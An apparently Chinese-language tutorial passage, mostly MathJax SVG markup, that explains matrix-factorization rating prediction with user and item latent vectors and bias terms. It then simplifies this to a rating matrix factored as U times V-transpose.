<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 33.114ex"><svg style="vertical-align: -0.731ex; min-width: 33.114ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="2.594ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -823.2)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2078, 0) translate(-2078, 0)"><g transform="translate(0 823.2) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="5240.1 -823.2 1 1146.5"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, -68.5)"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi" transform="translate(24.5, 0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(55.6, -29)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z"></path></g></g></g><g data-mml-node="TeXAtom" transform="translate(555.6, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(572, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1531.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msubsup" transform="translate(2587.6, 0)"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(510.7, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(446, -247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="msub" transform="translate(3646.1, 0)"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(503, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4825.8, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(5826, 0)"><path data-c="1D707" d="M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z"></path></g><g data-mml-node="mo" transform="translate(6651.2, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(7651.4, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(429, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(8596.6, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(9596.8, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(429, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1278 -823.2 1 1146.5"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-1" transform="translate(0, -68.5)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(389, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(889, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>其中<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="1.674ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 740 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(446, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>是第i个item对相应的隐向量，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="2.166ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 957.5 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(503, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>是第u个user对应的隐向量，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.636ex" height="1.927ex" role="img" focusable="false" viewBox="0 -694 723 851.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(429, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>代表item的偏置，用于解释商品本身的热门和冷门，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.999ex" height="1.927ex" role="img" focusable="false" viewBox="0 -694 883.5 851.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(429, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>代表user的偏置，用于解释用户本身的打分偏好（例如有些人喜欢打低分），μ是常数。</p>
<p>为了简便起见，这里先不考虑物品的偏置和常数项，简单的将评分视为用户对物品的打分，评分矩阵表示为：</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 27.226ex"><svg style="vertical-align: -0.731ex; min-width: 27.226ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="2.594ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -823.2)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2078, 0) translate(-2078, 0)"><g transform="translate(0 823.2) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="3939 -823.2 1 1146.5"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, -68.5)"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="TeXAtom" transform="translate(750, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(878, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1656, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2673, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(3728.8, 0)"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="TeXAtom" transform="translate(683, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(878, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1656, 0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="msubsup" transform="translate(5951.7, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(828.3, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 